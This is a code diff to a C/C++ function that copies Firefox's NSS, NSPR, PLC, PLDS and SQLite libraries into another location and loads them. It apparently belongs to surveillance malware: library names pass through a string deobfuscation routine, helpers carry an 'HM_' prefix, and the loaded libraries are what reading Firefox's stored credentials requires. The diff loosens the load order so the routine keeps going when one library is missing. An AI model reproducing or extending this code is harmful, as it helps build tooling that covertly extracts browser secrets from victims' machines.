@@ -265,55 +265,57 @@ void FireFoxInitFunc()
 		swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(NSPR_LIBRARY_NAME));
 		HM_CompletePath(DeobStringA(NSPR_LIBRARY_NAME), destPath);
 		libnspr4 = CopyAndLoadDLL(loadPath, destPath);
-		if (!libnspr4)
-			return;
+		//if (!libnspr4)
+			//return;
 	}
 
-	if (!libpld) {
-		swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(PLDS_LIBRARY_NAME));
-		HM_CompletePath(DeobStringA(PLDS_LIBRARY_NAME), destPath);
-		libpld = CopyAndLoadDLL(loadPath, destPath);
-		if (!libpld)
-			return;
-	}
-
-	if (!libplc) {
-		swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(PLC_LIBRARY_NAME));
-		HM_CompletePath(DeobStringA(PLC_LIBRARY_NAME), destPath);
-		libplc = CopyAndLoadDLL(loadPath, destPath);
-		if (!libplc)
-			return;
-	}
-
-	if (FF_ver_3) { 
-		if (!libnssu) {
-			swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(NSSU_LIBRARY_NAME));
-			HM_CompletePath(DeobStringA(NSSU_LIBRARY_NAME), destPath);
-			libnssu = CopyAndLoadDLL(loadPath, destPath);
-			if (!libnssu)
+	if (libnspr4) {
+		if (!libpld) {
+			swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(PLDS_LIBRARY_NAME));
+			HM_CompletePath(DeobStringA(PLDS_LIBRARY_NAME), destPath);
+			libpld = CopyAndLoadDLL(loadPath, destPath);
+			if (!libpld)
 				return;
 		}
 
-		if (!libsql) {
-			swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(SQLITE_LIBRARY_NAME));
-			HM_CompletePath(DeobStringA(SQLITE_LIBRARY_NAME), destPath);
-			libsql = CopyAndLoadDLL(loadPath, destPath);
-			if (!libsql) { // Su FireFox4 la libreria si chiama diversamente
-				swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(SQLITEALT_LIBRARY_NAME));
-				HM_CompletePath(DeobStringA(SQLITEALT_LIBRARY_NAME), destPath);
-				libsql = CopyAndLoadDLL(loadPath, destPath);
-				if (!libsql)
+		if (!libplc) {
+			swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(PLC_LIBRARY_NAME));
+			HM_CompletePath(DeobStringA(PLC_LIBRARY_NAME), destPath);
+			libplc = CopyAndLoadDLL(loadPath, destPath);
+			if (!libplc)
+				return;
+		}
+
+		if (FF_ver_3) { 
+			if (!libnssu) {
+				swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(NSSU_LIBRARY_NAME));
+				HM_CompletePath(DeobStringA(NSSU_LIBRARY_NAME), destPath);
+				libnssu = CopyAndLoadDLL(loadPath, destPath);
+				if (!libnssu)
 					return;
 			}
-		}
-	}
 
-	if (!libsof) {
-		swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(SOFTN_LIBRARY_NAME));
-		HM_CompletePath(DeobStringA(SOFTN_LIBRARY_NAME), destPath);
-		libsof = CopyAndLoadDLL(loadPath, destPath);
-		if (!libsof)
-			return;
+			if (!libsql) {
+				swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(SQLITE_LIBRARY_NAME));
+				HM_CompletePath(DeobStringA(SQLITE_LIBRARY_NAME), destPath);
+				libsql = CopyAndLoadDLL(loadPath, destPath);
+				if (!libsql) { // Su FireFox4 la libreria si chiama diversamente
+					swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(SQLITEALT_LIBRARY_NAME));
+					HM_CompletePath(DeobStringA(SQLITEALT_LIBRARY_NAME), destPath);
+					libsql = CopyAndLoadDLL(loadPath, destPath);
+					if (!libsql)
+						return;
+				}
+			}
+		}
+
+		if (!libsof) {
+			swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(SOFTN_LIBRARY_NAME));
+			HM_CompletePath(DeobStringA(SOFTN_LIBRARY_NAME), destPath);
+			libsof = CopyAndLoadDLL(loadPath, destPath);
+			if (!libsof)
+				return;
+		}
 	}
 
 	if (!libnss) {
@@ -322,6 +324,9 @@ void FireFoxInitFunc()
 		libnss = CopyAndLoadDLL(loadPath, destPath);
 		if (!libnss)
 			return;
+
+		if (!libsql)
+			libsql = libnss;
 	}
 
 	swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(FREEBL3_LIBRARY_NAME));
